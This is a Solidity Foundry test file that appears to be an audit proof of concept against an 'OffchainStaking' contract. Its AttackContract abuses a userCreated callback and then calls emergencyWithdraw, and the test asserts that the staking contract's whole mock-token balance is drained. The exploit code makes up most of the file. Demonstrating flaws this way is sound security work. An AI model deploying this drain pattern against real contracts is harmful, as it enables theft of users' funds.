// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {OffchainStaking, IERC20} from "src/OffchainStaking.sol";
import {MockERC20} from "forge-std/mocks/MockERC20.sol";

contract PoC is Test {
    MockToken token;
    OffchainStaking offchainStaking;
    address multisig = makeAddr("multisig");
    address attackerMSig = makeAddr("attackerMSig");

    function setUp() public {
        token = new MockToken();
        offchainStaking = new OffchainStaking(multisig, IERC20(address(token)));
    }

    function testCreateUser() public {
        offchainStaking.createUser();
    }

    function testPoC() public {
        AttackContract attack = new AttackContract(
            address(offchainStaking),
            address(token)
        );
        token.mint(address(attack), 100);
        token.mint(address(offchainStaking), 1e18);
        console.log("attack contract", address(attack));
        console.log("staking contract", address(offchainStaking));
        console.log("multisig contract", address(multisig));

        attack.attack();
        attack.attackFollowUp();

        console.log("balance of attack", token.balanceOf(address(attack)));
        console.log(
            "balance of offchainStaking",
            token.balanceOf(address(offchainStaking))
        );

        assert(token.balanceOf(address(attack)) == 1e18 + 100);
        assert(token.balanceOf(address(offchainStaking)) == 0);
    }
}

contract AttackContract {
    OffchainStaking offchainStaking;
    MockToken token;
    uint256 totalToTake = 1e18 + 100;

    constructor(address offchainStakingAddr, address tokenMock) {
        offchainStaking = OffchainStaking(offchainStakingAddr);
        token = MockToken(tokenMock);
    }

    function attack() public {
        token.approve(address(offchainStaking), 100);
        offchainStaking.createUser();
        offchainStaking.deposit(100);
    }

    function attackFollowUp() public {
        offchainStaking.emergencyWithdraw(address(this), totalToTake);
    }

    function userCreated() public returns (bool) {
        offchainStaking.transferUser(address(this));
        return true;
    }
}

contract MockToken is MockERC20 {
    constructor() {
        initialize("MockToken", "MTK", 18);
    }

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
